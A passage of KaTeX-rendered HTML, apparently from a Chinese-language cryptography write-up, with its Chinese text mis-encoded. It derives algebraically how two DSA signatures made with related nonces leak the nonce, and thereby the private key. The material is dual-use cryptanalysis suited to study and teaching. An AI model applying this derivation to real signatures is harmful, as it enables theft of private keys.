class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1205469999999997em;vertical-align:-0.256439em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4435610000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.256439em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.899108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1205469999999997em;vertical-align:-0.256439em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4435610000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.256439em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">ç­¾</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">å¯¹</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub><mtext>çš„å¼å­ä¹˜ä»¥</mtext><msub><mi>r</mi><mn>2</mn></msub><mo>:</mo><msub><mi>s</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>k</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>2</mn></msub><mo>=</mo><msub><mi>H</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>2</mn></msub><mo>+</mo><mi>x</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>2</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace linebreak="newline"></mspace><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>2</mn></msub><mtext>çš„å¼å­æŠŠ</mtext><msub><mi>k</mi><mn>2</mn></msub><mo>=</mo><mtext>çš„å¼å­å¸¦è¿›å»</mtext><mo>:</mo><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ—</mo><msub><mi>k</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><msup><mo stretchy="false">)</mo><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>âˆ—</mo><mo stretchy="false">(</mo><msub><mi>H</mi><mn>2</mn></msub><mo>+</mo><mi>x</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>2</mn></msub><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ—</mo><msub><mi>k</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>H</mi><mn>2</mn></msub><mo>+</mo><mi>x</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>2</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>2</mn></msub><mo>âˆ—</mo><mi>a</mi><mo>âˆ—</mo><msub><mi>k</mi><mn>1</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub><mo>âˆ—</mo><mi>b</mi><mo>=</mo><msub><mi>H</mi><mn>2</mn></msub><mo>+</mo><mi>x</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>2</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>2</mn></msub><mo>âˆ—</mo><mi>a</mi><mo>âˆ—</mo><msub><mi>k</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>1</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub><mo>âˆ—</mo><mi>b</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>1</mn></msub><mo>=</mo><msub><mi>H</mi><mn>2</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>1</mn></msub><mo>+</mo><mi>x</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>2</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>1</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace linebreak="newline"></mspace><mspace linebreak="newline"></mspace><mtext>ä¸¤å¼ç›¸å‡ï¼Œå¾—ï¼š</mtext><mspace linebreak="newline"></mspace><msub><mi>k</mi><mn>1</mn></msub><mo>âˆ—</mo><mo stretchy="false">(</mo><msub><mi>r</mi><mn>2</mn></msub><mo>âˆ—</mo><msub><mi>s</mi><mn>1</mn></msub><mo>âˆ’</mo><mi>a</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>s</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>H</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>2</mn></msub><mo>âˆ’</mo><msub><mi>H</mi><mn>2</mn></msub><mo>âˆ—</mo><msub><mi>r</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>s</mi><mn>2</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace linebreak="newline"></mspace><mtext>åˆ°è¿™ä¸€æ­¥åï¼Œæˆ‘ä»¬çŸ¥é“</mtext><mi>a</mi><mo>=</mo><mi>k</mi><mo separator="true">,</mo><mi>b</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mtext>æ‰€ä»¥æœ‰</mtext><mo>:</mo><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>1</mn></msub><msub><mi>r</mi><mn>2</mn></msub><msub><mi>k</mi><mn>1</mn></msub><mo>âˆ’</mo><msub><mi>r</mi><mn>1</mn></msub><msub><mi>s</mi><mn>2</mn></msub><msubsup><mi>k</mi><mn>1</mn><mn>2</mn></msubsup><mo>=</mo><msub><mi>H</mi><mn>1</mn></msub><msub><mi>r</mi><mn>2</mn></msub><mo>âˆ’</mo><msub><mi>H</mi><mn>2</mn></msub><msub><mi>r</mi><mn>1</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">s_1çš„å¼å­ä¹˜ä»¥r_2:s_1*k_1*r_2=H_1*r_2+x*r_1*r_2\mod q\\\\s_2çš„å¼å­æŠŠk_2=çš„å¼å­å¸¦è¿›å»:\\s_2=(a*k_1+b)^{-1}*(H_2+x*r_2)\mod q\\s_2*(a*k_1+b)=H_2+x*r_2\mod q\\s_2*a*k_1+s_2*b=H_2+x*r_2\mod q\\s_2*a*k_1*r_1+s_2*b*r_1=H_2*r_1+x*r_2*r_1\mod q\\\\ä¸¤å¼ç›¸å‡ï¼Œå¾—ï¼š\\k_1*(r_2*s_1-a*r_1*s_2)=H_1*r_2-H_2*r_1+b*r_1*s_2\mod q\\åˆ°è¿™ä¸€æ­¥åï¼Œæˆ‘ä»¬çŸ¥é“a=k,b=0,æ‰€ä»¥æœ‰:\\s_1r_2k_1-r_1s_2k_1^2=H_1r_2-H_2r_1\mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">å¼</span><span class="mord cjk_fallback">å­</span><span class="mord cjk_fallback">ä¹˜</span><span class="mord cjk_fallback">ä»¥</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">å¼</span><span class="mord cjk_fallback">å­</span><span class="mord cjk_fallback">æŠŠ</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">å¼</span><span class="mord cjk_fallback">å­</span><span class="mord cjk_fallback">å¸¦</span><span class="mord cjk_fallback">è¿›</span><span class="mord cjk_fallback">å»</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" 